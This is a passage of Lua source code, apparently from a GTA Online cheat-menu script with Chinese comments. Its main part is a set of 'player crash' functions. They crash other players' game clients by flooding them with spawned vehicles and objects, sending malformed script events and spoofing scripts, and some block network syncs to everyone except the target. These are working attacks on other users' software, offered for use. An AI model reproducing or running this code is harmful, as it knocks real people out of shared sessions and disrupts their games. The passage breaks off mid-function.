            local bone_id = PED.GET_PED_BONE_INDEX(players.user_ped(), bone)
            fx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(man_ptfx_effect, players.user_ped(), 0.0, 0.0, 0.0, 0.0, 0.0, 0, bone_id, 1, false, false, false, 0, 0, 0, 0)
            load_ptfxs[#load_ptfxs+1] = fx
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, 0, 255, 255, 255)
        end
        end
    if not on then 
        for _, p in pairs(load_ptfxs) do
            GRAPHICS.REMOVE_PARTICLE_FX(p, false)
            GRAPHICS.STOP_PARTICLE_FX_LOOPED(p, false)
        end
    else
        request_ptfx_asset(man_ptfx_asset)
        for _, bone in pairs(l_bones) do
            GRAPHICS.USE_PARTICLE_FX_ASSET(man_ptfx_asset)
            local bone_id = PED.GET_PED_BONE_INDEX(players.user_ped(), bone)
            fx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(man_ptfx_effect, players.user_ped(), 0.0, 0.0, 0.0, 0.0, 0.0, 0, bone_id, 1, false, false, false, 0, 0, 0, 0)
            load_ptfxs[#load_ptfxs+1] = fx
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, 0, 0, 255, 255)
        end
    end
end
--
function request_control_of_entity(vehicle)
    if not util.is_session_started() then 
        return 
    end
    local ctr = 0
    local migrate_ctr = 0
    if vehicle != 0 then
        if not entities.get_can_migrate(vehicle) then
            repeat
                if migrate_ctr >= 250 then
                    ctr = 0
                    return
                end
                entities.set_can_migrate(vehicle, true)
                migrate_ctr +=1 
                util.yield()
            until entities.get_can_migrate(vehicle)
            migrate_ctr = 0
        end
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) do
            if ctr >= 250 then
                ctr = 0
                return
            end
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
            util.yield()
            ctr += 1
        end
    end
end
--
function Quick_Enable(on)
    if on then
        G_Self = GTluaScript.attach_before(GTluaScript.ref_by_path('Self>Movement'),GTluaScript.action(GTluaScript.shadow_root(), 'GTLua 自我选项', {""}, '', function()
            menu.trigger_command(selflist)
        end))
        G_Veh = GTluaScript.attach_before(GTluaScript.ref_by_path('Vehicle>Spawner'),GTluaScript.action(GTluaScript.shadow_root(), 'GTLua 载具选项', {""}, '', function()
            menu.trigger_command(carfly)
        end))
        G_Online = GTluaScript.attach_before(GTluaScript.ref_by_path('Online>New Session'),GTluaScript.action(GTluaScript.shadow_root(), 'GTLua 线上选项', {""}, '', function()
            menu.trigger_command(onlinemode)
        end))
        G_World = GTluaScript.attach_before(GTluaScript.ref_by_path('World>Places'),GTluaScript.action(GTluaScript.shadow_root(), 'GTLua 世界选项', {""}, '', function()
            menu.trigger_command(lobbyFeats)
        end))
        G_Game = GTluaScript.attach_before(GTluaScript.ref_by_path('Game>Disables'),GTluaScript.action(GTluaScript.shadow_root(), 'GTLua 游戏娱乐', {""}, '', function()
            menu.trigger_command(funfeatures)
        end))
    else
        menu.delete(G_Self)
        menu.delete(G_Veh)
        menu.delete(G_Online)
        menu.delete(G_World)
        menu.delete(G_Game)
    end
end
--
local ent_a = memory.alloc_int()
function rrren(on)
    PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), ent_a)
    if memory.read_int(ent_a) ~= 0 then 
        local ent = memory.read_int(ent_a)
        if ENTITY.GET_ENTITY_TYPE(ent) == 1 and PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(players.user(), ent) then
            if PED.GET_PED_CONFIG_FLAG(players.user_ped(), 78, true) then  
                local boxSize = v3.new(0.8, 0.8, 1.7) 
                local boxColor = {r = 0, g = 0, b = 255, a = 150}
                local pedCoords = ENTITY.GET_ENTITY_COORDS(ent)
                local minBounds = v3.new(pedCoords.x - boxSize.x / 2, pedCoords.y - boxSize.y / 2, pedCoords.z - boxSize.z / 1.7)
                local maxBounds = v3.new(pedCoords.x + boxSize.x / 2, pedCoords.y + boxSize.y / 2, pedCoords.z + boxSize.z / 1.7)
                GRAPHICS.DRAW_BOX(minBounds.x, minBounds.y, minBounds.z, maxBounds.x, maxBounds.y, maxBounds.z, boxColor.r, boxColor.g, boxColor.b, boxColor.a)
            end
        end
    end
end
------------------------------------
-------------玩家崩溃---------------
------------------------------------
function fireworkcrash(pid)
    notification("寂寞陪伴着他们...")
    local cord = getEntityCoords(getPlayerPed(pid))
    local object = entities.create_object(util.joaat("docktrailer"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("docktug"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("trailers2"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("tvtrailer"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("trflat"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("hei_prop_carrier_trailer_01"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("cs2_02_temp_trailer"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("tr_prop_tr_truktrailer_01a"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("trailer_casting"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("trailer_casting_int"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("dubsta"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("hydra"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("sm_prop_smug_havok"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("dt1_11_heliport"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("dt1_11_heliport_st"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("sf_prop_sf_heli_blade_b_02a"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("w_ex_snowball"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("w_ex_apmine"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("w_lr_homing_rocket"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("prop_xmas_tree_int"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("prop_xmas_ext"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("v_31a_jh_tunn_03aextra"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("issi8"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    local object = entities.create_object(util.joaat("kosatka"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)))
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, true, true)
    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(object, 1, 0.0, 10000.0, 0.0, 0.0, 0.0, 0.0, false, true, true, false, true)
    ENTITY.SET_ENTITY_ROTATION(object, math.random(0, 360), math.random(0, 360), math.random(0, 360), 0, true)
    ENTITY.SET_ENTITY_VELOCITY(object, math.random(-10, 10), math.random(-10, 10), math.random(30, 50))
    ENTITY.ATTACH_ENTITY_TO_ENTITY(object, object, 0, 0, -1, 2.5, 0, 180, 0, 0, false, true, false, 0, true)
    util.yield(300)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(cord.x, cord.y, cord.z + 1, cord.x, cord.y, cord.z, 0, true, util.joaat("weapon_heavysniper_mk2"), players.user_ped(), false, true, 1.0)
    ENTITY.DETACH_ENTITY(object, object)
end
function rocketkoko(pid)
    local stupid_pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(0,pid)) stupid_pos.x = stupid_pos.x - 2
    util.create_thread(function ()
    local mod_vel = {-692292317,-1323100960,4244420235,444583674,184361638,642617954,586013744,920453016,3186376089,1030400667,240201337,
    1492612435, 3517794615, 3889340782, 3253274834,970385471, 2336777441, 184361638, 1030400667, 920453016, 240201337, 642617954, 
    586013744, 868868440, 1550581940, 3334677549, 3186376089,0xc5dd6967,0x58f77553,0x1446590a}
    for _spawn, value in pairs(mod_vel) do
    local s = {}
    for i = 1, 10, 1 do  
    s[_spawn] = CreateVehicle(value,stupid_pos,0)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(PLAYER.GET_PLAYER_PED(pid),Entity, true, false)
    wait(0)
    end
    end
    wait(0)
    local ar_vs = entities.get_all_vehicles_as_handles()
    for key, value in pairs(ar_vs) do
    entities.delete_by_handle(value)
    end
    end,nil)
end
function weedfire(pid)
    local cord = getEntityCoords(getPlayerPed(pid))
    local a1 = entities.create_object(-930879665, cord)
    local a2 = entities.create_object(3613262246, cord)
    local b1 = entities.create_object(452618762, cord)
    local b2 = entities.create_object(3613262246, cord)
    for i = 1, 10 do
        util.request_model(-930879665)
        util.yield(10)
        util.request_model(3613262246)
        util.yield(10)
        util.request_model(452618762)
        util.yield(10)
        entities.delete_by_handle(a1)
        entities.delete_by_handle(a2)
        entities.delete_by_handle(b1)
        entities.delete_by_handle(b2)
        util.request_model(452618762)
        util.yield(10)
        util.request_model(3613262246)
        util.yield(10)
        util.request_model(-930879665)
        flag = entities.create_object(util.joaat("apa_prop_flag_canada_yt"),cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(flag, true, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(flag, flag, 0, 0, -1, 2.5, 0, 180, 0, 0, false, true, false, 0, true)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(flag, 1, 0.0, 10000.0, 0.0, 0.0, 0.0, 0.0, false, true, true, false, true)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(cord.x, cord.y, cord.z + 1, cord.x, cord.y, cord.z, 0, true, util.joaat("apa_prop_flag_canada_yt"), players.user_ped(pid), false, true, 1.0)
        util.yield(10)
    end
end
function reolcrash(pid)
    menu.trigger_commands("footlettuce" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("steamroll" .. PLAYER.GET_PLAYER_NAME(pid))
    local stupid_pos<const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    local stupid_pos<const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    stupid_pos.x = stupid_pos.x - 2
    util.create_thread(function()
        local mod_vel = {-692292317, -1323100960, 4244420235, 444583674, 184361638, 642617954, 586013744, 920453016,
                         3186376089, 1030400667, 240201337, 1492612435, 3517794615, 3889340782, 3253274834, 970385471,
                         2336777441, 184361638, 1030400667, 920453016, 240201337, 642617954, 586013744, 868868440,
                         1550581940, 3334677549, 3186376089, 0xc5dd6967, 0x58f77553, 0x1446590a}
        for _spawn, value in pairs(mod_vel) do
            local s = {}
            for i = 1, 10, 1 do
                s[_spawn] = CreateVehicle(value, stupid_pos, 0)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(PLAYER.GET_PLAYER_PED(pid), Entity, true, false)
                wait(0)
            end
        end
        wait(0)
        local ar_vs = entities.get_all_vehicles_as_handles()
        for key, value in pairs(ar_vs) do
            entities.delete_by_handle(value)
        end
    end, nil)
end
function commandsc(pid)
    menu.trigger_commands("12crash".. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("fragment".. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("loveclick".. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("nsacrash".. PLAYER.GET_PLAYER_NAME(pid))
end
--
function setAttribute(attacker)
    PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 46, true)
    PED.SET_PED_COMBAT_RANGE(attacker, 4)
    PED.SET_PED_COMBAT_ABILITY(attacker, 3)
end
function request_animation(hash)
    STREAMING.REQUEST_ANIM_DICT(hash)
    while not STREAMING.HAS_ANIM_DICT_LOADED(hash) do
        util.yield()
    end
end
GetCoordsInFrontOfEntity = function(entity, distance)
	if not ENTITY.DOES_ENTITY_EXIST(entity) then
		return v3.new(0.0, 0.0, 0.0)
	end
	local coords = ENTITY.GET_ENTITY_FORWARD_VECTOR(entity)
	coords:mul(distance)
	coords:add(ENTITY.GET_ENTITY_COORDS(entity, true))
	return coords
end
function busy(pid)
    local anim_dict = "anim@mp_player_intupperstinker"
    if not STREAMING.HAS_ANIM_DICT_LOADED(anim_dict) then
        request_animation(anim_dict)
    end
    local pos = GetCoordsInFrontOfEntity(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 20)
    local ped = PED.CREATE_RANDOM_PED(pos.x, pos.y, pos.z+10)
    ENTITY.SET_ENTITY_VISIBLE(ped, false)
    ENTITY.FREEZE_ENTITY_POSITION(ped, true)
    setAttribute(ped)
    for i = 1, 10 do
        local pos = GetCoordsInFrontOfEntity(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 20)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped, pos.x, pos.y, pos.z+5, true, true, true)
        TASK.TASK_SWEEP_AIM_POSITION(ped, anim_dict, "G", "T", "VIP", -1, 0.0, 0.0, 0.0, 0.0, 0.0)
        wait(1000)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
    end
    entities.delete_by_handle(ped)
    wait(750)
end
function fanchuan(pid)
    --menu.trigger_commands("steamroll" .. PLAYER.GET_PLAYER_NAME(pid))
    if pid ~= players.user() then
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(pid)
        local mdl = util.joaat("mp_m_freemode_01")
        local veh_mdl = util.joaat("taxi")
        util.request_model(veh_mdl)
        util.request_model(mdl)
            for i = 1, 10 do
                if not players.exists(pid) then
                    return
                end
                local veh = entities.create_vehicle(veh_mdl, pos, 0)
                local jesus = entities.create_ped(2, mdl, pos, 0)
                ENTITY.SET_ENTITY_VISIBLE(veh, false)
                ENTITY.SET_ENTITY_VISIBLE(jesus, false)
                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                setAttribute(jesus)
                wait(100)
                TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
                wait(1000)
                entities.delete_by_handle(jesus)
                entities.delete_by_handle(veh)
            end  
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end
end
--
function spawn_vehicle(hash,pos,isGodMode,isFreeze)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do		
		wait(1)
	end
   local car= entities.create_vehicle(hash,pos,0)
    if isGodMode then 
        ENTITY.SET_ENTITY_INVINCIBLE(car,true)
    end
    if isFreeze then
        ENTITY.FREEZE_ENTITY_POSITION(car,true)
    end
    return car
end
function delete_entity_by_vehicle(hash)
    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
        if ENTITY.GET_ENTITY_MODEL(ent)==hash then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
        end
    end
end
--赞助崩
function ogcrash(pid)
    local nameog = PLAYER.GET_PLAYER_NAME(pid)
    gtoast("发送到" ..nameog)
    util.trigger_script_event(1 << pid, {891653640, 0, 81468, 96773, 84776, 2939, 20158,  14219,  38254,  22206})
    menu.trigger_commands("choke".. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("steamroll".. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("rainbowpapaw".. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("toggleyulemonster".. PLAYER.GET_PLAYER_NAME(pid) .. " on")
    wait(1000)
    menu.trigger_commands("toggleyulemonster".. PLAYER.GET_PLAYER_NAME(pid) .. " off")
end
---因莎拉崩溃
function inshellcrash(pid)
    local TargetPPos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local PED1  = CreatePed(28,-1011537562,TargetPPos,0)
    local PED2  = CreatePed(28,-541762431,TargetPPos,0)
    WEAPON.GIVE_WEAPON_TO_PED(PED1,-1813897027,1,true,true)
    WEAPON.GIVE_WEAPON_TO_PED(PED2,-1813897027,1,true,true)
    wait(1000)
    TASK.TASK_THROW_PROJECTILE(PED1,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)
    TASK.TASK_THROW_PROJECTILE(PED2,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)
    notification("Finished.",colors.red)
end
--for 大自然崩溃v1 v2 泡泡糖崩溃 绿玩保护崩溃
local function BlockSyncs(pid, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    wait(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end
--大自然崩溃
function naturecrashv1(pid)
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    BlockSyncs(pid, function()
        wait(100)
        menu.trigger_commands("invisibility on")
        for i = 0, 110 do
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
            PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
            wait(50)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        end
        wait(250)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        menu.trigger_commands("invisibility off")
    end)
end
---大自然崩溃 v2
function naturecrashv2(pid)
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    BlockSyncs(pid, function() 
        wait(100)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
        wait()
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
        wait(250)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        wait(1000)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
    end)
end
--悲伤的耶稣
function greifcrash(pid)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = players.get_position(pid)
		local mdl = util.joaat("u_m_m_jesus_01")
		local veh_mdl = util.joaat("oppressor")
		util.request_model(veh_mdl)
        util.request_model(mdl)
			for i = 1, 10 do
				if not players.exists(pid) then
					return
				end
				local veh = entities.create_vehicle(veh_mdl, pos, 0)
				local jesus = entities.create_ped(2, mdl, pos, 0)
				PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
				wait(100)
				TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
				wait(1000)
				entities.delete_by_handle(jesus)
				entities.delete_by_handle(veh)
			end
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
end
function sugercrash(pid)
    local mdl = util.joaat("apa_mp_apa_yacht")
    local user = players.user_ped()
    BlockSyncs(pid, function()
    wait(250)
    local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
    PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
    PLAYER.SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
    wait(50)
    local pos = players.get_position(pid)
    pos.z += 300
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
    repeat
        wait()
    until PED.GET_PED_PARACHUTE_STATE(user) == 0
    PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    wait(50)
    TASK.CLEAR_PED_TASKS(user)
    wait(50)
    PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    repeat
        wait()
    until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
    pcall(TASK.CLEAR_PED_TASKS_IMMEDIATELY, user)
    PLAYER.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
    pcall(ENTITY.SET_ENTITY_COORDS, user, old_pos.x, old_pos.y, old_pos.z, false, false)
    end)
end
--[[function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        wait()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end]]
--碎片崩溃
function fragmentcrash(pid)
    BlockSyncs(pid, function()
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        wait(1000)
        entities.delete_by_handle(object)
    end)
end
--美杜莎崩溃
function MDS(pid)
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
	local plauuepos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    plauuepos.x = plauuepos.x + 5
    plauuepos.z = plauuepos.z + 5
    local hunter = {}
    for i = 1 ,3 do
        for n = 0,120 do
            hunter[n] = CreateVehicle(1077420264,plauuepos,0)
            wait(0)
            ENTITY.FREEZE_ENTITY_POSITION(hunter[n],true)
            wait(0)
            VEHICLE.EXPLODE_VEHICLE(hunter[n], true, true)
        end
        wait(190)
        for i = 1,#hunter do
            if hunter[i] ~= nil then
                entities.delete_by_handle(hunter[i])
            end
        end
    end
    gtoast("Finished!")
	menu.trigger_commands("anticrashcam off")
    hunter = nil
    plauuepos = nil	
end
function CreateVehicle(Hash, Pos, Heading, Invincible)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do wait() end
        local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        if Invincible then
            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
        end
        return SpawnedVehicle
    end
function CreateObject(Hash, Pos, static)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do wait() end
    local SpawnedVehicle = entities.create_object(Hash, Pos)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if static then
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end
function CreatePed(index, Hash, Pos, Heading)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do wait() end
    local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    return SpawnedVehicle
end
--声音崩溃V1
function soundcrashv1(pid)
    local time = util.current_time_millis() + 2000
            while time > util.current_time_millis() do
                local pos=ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
                for i = 1, 10 do
                    AUDIO.PLAY_SOUND_FROM_COORD(-1,"10s",pos.x,pos.y,pos.z,"MP_MISSION_COUNTDOWN_SOUNDSET",true, 70, false)
                end
                wait(0)
            end
        end 
--声音崩溃V2
function soundcrashv2(pid)
    local time = util.current_time_millis() + 2000
            while time > util.current_time_millis() do
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
                for i = 1, 20 do
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Event_Message_Purple', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
                end
                wait()
            end	
        end
---无效模型崩溃
function wxcrash(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
    local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
    local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
    local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
    for i = 0, 100 do 
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    wait(10)
    end
    wait(2000)
    entities.delete_by_handle(Object_pizza1)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza3)
    entities.delete_by_handle(Object_pizza4)
    end
---5g崩溃
function x999gcrash(pid)
    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
    pos.z = pos.z + 10
    veh = entities.get_all_vehicles_as_handles()                       
    for i = 1, #veh do
     NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
     ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
     TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
     TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
    end
end
--6G崩溃
    function six6crash(pid)
    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
    pos.z = pos.z + 5
    veh = entities.get_all_vehicles_as_handles()
    for i = 1, #veh do
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
